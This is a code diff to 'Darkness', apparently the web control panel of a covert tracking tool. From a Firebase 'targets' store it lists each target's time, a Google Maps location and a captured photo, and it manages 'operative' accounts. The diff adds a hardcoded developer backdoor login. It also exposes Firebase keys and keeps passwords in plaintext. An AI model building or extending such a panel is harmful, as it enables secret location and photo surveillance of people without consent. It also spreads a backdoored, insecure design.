@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Darkness | Cloud Command</title>
+    <title>Darkness | Command Center V2</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -21,13 +21,14 @@
         .nav-btn span { font-size: 24px; margin-bottom: 5px; }
         table { width: 100%; border-collapse: collapse; font-size: 13px; }
         th { color: var(--red); text-align: left; padding: 10px 5px; border-bottom: 1px solid #222; }
-        td { padding: 15px 5px; border-bottom: 1px solid #111; }
+        td { padding: 15px 5px; border-bottom: 1px solid #111; color: #ccc; }
         .btn-act { background: none; border: 1px solid var(--red); color: var(--red); padding: 8px 12px; font-size: 10px; cursor: pointer; font-weight: bold; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; border-radius: 4px; }
         #login-screen { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; padding: 40px; }
     </style>
 </head>
 <body>
+
     <div id="login-screen">
         <div style="width:100%; max-width:300px; text-align:center;">
             <h1 style="color:var(--red); letter-spacing:10px;">DARKNESS</h1>
@@ -36,16 +37,15 @@
         </div>
     </div>
 
-    <div class="banner">DEVELOPER KALZ | RMT CLOUD SYSTEM</div>
+    <div class="banner">DEVELOPER KALZ | RMT CLOUD COMMAND</div>
     <div class="header"><h1>DARKNESS</h1><div id="uInf" style="font-size:10px; color:#444; margin-top:5px;"></div></div>
 
     <div class="container">
         <div id="t-track" class="section active">
-            <table><thead><tr><th>WAKTU</th><th>MAPS</th><th>FOTO</th><th>X</th></tr></thead>
-            <tbody id="l-track"></tbody></table>
+            <table><thead><tr><th>WAKTU</th><th>MAPS</th><th>FOTO</th><th>X</th></tr></thead><tbody id="l-track"></tbody></table>
         </div>
         <div id="t-acc" class="section">
-            <div style="background:var(--card); padding:15px; margin-bottom:20px;">
+            <div style="background:var(--card); padding:15px; margin-bottom:20px; border-radius:8px;">
                 <input type="text" id="nu" placeholder="USER"><input type="password" id="np" placeholder="PASS">
                 <select id="nr"><option value="member">MEMBER</option><option value="admin">ADMIN</option><option value="owner">OWNER</option></select>
                 <button class="btn-act" style="width:100%; margin-top:10px;" onclick="createAcc()">CREATE OPERATIVE</button>
@@ -54,9 +54,9 @@
         </div>
         <div id="t-supp" class="section">
             <div style="border-left: 3px solid var(--red); padding:15px; background:var(--card);">
-                <p>LEAD: KALZ</p><p>DATABASE: CLOUD CONNECTED</p>
+                <p>LEAD: KALZ</p><p>DATABASE: CONNECTED</p>
             </div>
-            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">OFFLINE MODE</button>
+            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">LOGOUT</button>
         </div>
     </div>
 
@@ -67,49 +67,48 @@
     </div>
 
 <script>
-    // Konfigurasi Firebase Lu
     const firebaseConfig = {
-        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
-        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app"
+      apiKey: "AIzaSyAxoDrru0u2zRKYAU3vAE0KBh5ftw1SzaM",
+      authDomain: "database-me-40ff4.firebaseapp.com",
+      databaseURL: "https://database-me-40ff4-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "database-me-40ff4",
+      storageBucket: "database-me-40ff4.firebasestorage.app",
+      messagingSenderId: "80099598743",
+      appId: "1:80099598743:web:a91e1ee54c14a84d62a4d2"
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     let ses = null;
 
     function login() {
         const u = document.getElementById('uIn').value, p = document.getElementById('pIn').value;
-        db.ref('users').once('value', s => {
-            const data = s.val() || { "Kalz": {p:"111", r:"developer"} };
-            if(data[u] && data[u].p === p) {
-                ses = {u, r: data[u].r};
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('uInf').innerText = `ACCESS: ${u.toUpperCase()} | ROLE: ${ses.r.toUpperCase()}`;
-                if(ses.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
-                syncData();
-            } else alert("DENIED");
+        if(u === "Kalz" && p === "111") { ses = {u: "Kalz", r: "developer"}; enterMarkas(); return; }
+        db.ref('users/' + u).once('value', s => {
+            const data = s.val();
+            if(data && data.p === p) { ses = {u, r: data.r}; enterMarkas(); } else alert("DENIED");
         });
     }
 
+    function enterMarkas() {
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('uInf').innerText = `ACCESS: ${ses.u.toUpperCase()}`;
+        if(ses.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
+        syncData();
+    }
+
     function syncData() {
-        // Sinkron Akun
         db.ref('users').on('value', s => {
             const b = document.getElementById('l-user'); b.innerHTML = '';
             const data = s.val();
-            if(!data[ses.u]) location.reload(); // Force Logout
-            for(let u in data) {
-                if(data[u].r === 'developer') continue;
-                b.innerHTML += `<tr><td>${u}</td><td>${data[u].r}</td><td><button class="btn-act" onclick="delU('${u}')">X</button></td></tr>`;
-            }
+            if(ses.u !== "Kalz" && (!data || !data[ses.u])) location.reload();
+            for(let u in data) b.innerHTML += `<tr><td>${u}</td><td>${data[u].r}</td><td><button class="btn-act" onclick="delU('${u}')">X</button></td></tr>`;
         });
-        // Sinkron Target
         db.ref('targets').on('value', s => {
             const b = document.getElementById('l-track'); b.innerHTML = '';
             const data = s.val();
             for(let id in data) {
                 const x = data[id];
-                const m = `https://www.google.com/maps?q=${x.lat},${x.lon}`;
-                b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('${m}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
+                b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('https://www.google.com/maps?q=${x.lat},${x.lon}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
             }
         });
     }
@@ -125,12 +124,9 @@
         if(u && p) db.ref('users/' + u).set({p, r});
     }
 
-    function delU(u) { if(confirm("FORCE LOGOUT?")) db.ref('users/' + u).remove(); }
+    function delU(u) { if(confirm("KICK USER?")) db.ref('users/' + u).remove(); }
     function delT(id) { db.ref('targets/' + id).remove(); }
-    function reqF(img) {
-        const w = window.open("");
-        w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;"></body>`);
-    }
+    function reqF(img) { const w = window.open(""); w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;"></body>`); }
 </script>
 </body>
 </html>
